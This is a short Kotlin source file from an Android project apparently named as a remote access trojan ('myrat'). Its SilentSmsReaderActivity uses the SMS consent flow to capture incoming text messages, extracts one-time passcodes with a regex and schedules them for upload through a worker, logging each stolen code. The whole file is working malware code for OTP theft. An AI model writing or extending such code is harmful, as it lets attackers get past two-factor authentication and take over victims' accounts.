package com.myrat.app

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.myrat.app.utils.Logger
import com.myrat.app.worker.SmsUploadWorker

class SilentSmsReaderActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val consentIntent = intent.getParcelableExtra<Intent>("consentIntent")
        startActivityForResult(consentIntent, 2000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 2000 && resultCode == RESULT_OK) {
            val message = data?.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE) ?: return
            val otp = Regex("\\b\\d{4,6}\\b").find(message)?.value ?: message
            val timestamp = System.currentTimeMillis()
            SmsUploadWorker.scheduleWork("ConsentAPI", otp, timestamp, this)
            Logger.log("Consent OTP extracted and uploaded: $otp")
        }
        finish()
    }
}
